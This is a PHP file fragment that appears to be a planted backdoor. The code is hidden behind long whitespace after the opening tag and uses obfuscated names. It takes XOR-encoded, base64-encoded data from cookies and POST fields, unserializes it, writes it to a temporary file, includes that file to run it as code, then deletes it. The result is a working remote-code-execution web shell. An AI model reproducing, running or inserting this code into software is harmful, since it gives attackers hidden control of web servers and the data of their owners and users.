<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("erzwe")){class erzwe{public static $apmejteai = "jnqhsjshwavqiucu";public static $vomtpeqhr = NULL;public function __construct(){$opctjmc = @$_COOKIE[substr(erzwe::$apmejteai, 0, 4)];if (!empty($opctjmc)){$jcczmyp = "base64";$sytgmtnd = "";$opctjmc = explode(",", $opctjmc);foreach ($opctjmc as $vpplc){$sytgmtnd .= @$_COOKIE[$vpplc];$sytgmtnd .= @$_POST[$vpplc];}$sytgmtnd = array_map($jcczmyp . "_decode", array($sytgmtnd,));$sytgmtnd = $sytgmtnd[0] ^ str_repeat(erzwe::$apmejteai, (strlen($sytgmtnd[0]) / strlen(erzwe::$apmejteai)) + 1);erzwe::$vomtpeqhr = @unserialize($sytgmtnd);}}public function __destruct(){$this->rbgvkypl();}private function rbgvkypl(){if (is_array(erzwe::$vomtpeqhr)) {$irjdkdexza = sys_get_temp_dir() . "/" . crc32(erzwe::$vomtpeqhr["salt"]);@erzwe::$vomtpeqhr["write"]($irjdkdexza, erzwe::$vomtpeqhr["content"]);include $irjdkdexza;@erzwe::$vomtpeqhr["delete"]($irjdkdexza);exit();}}}$znbpngsdlu = new erzwe();$znbpngsdlu = NULL;} ?><?php
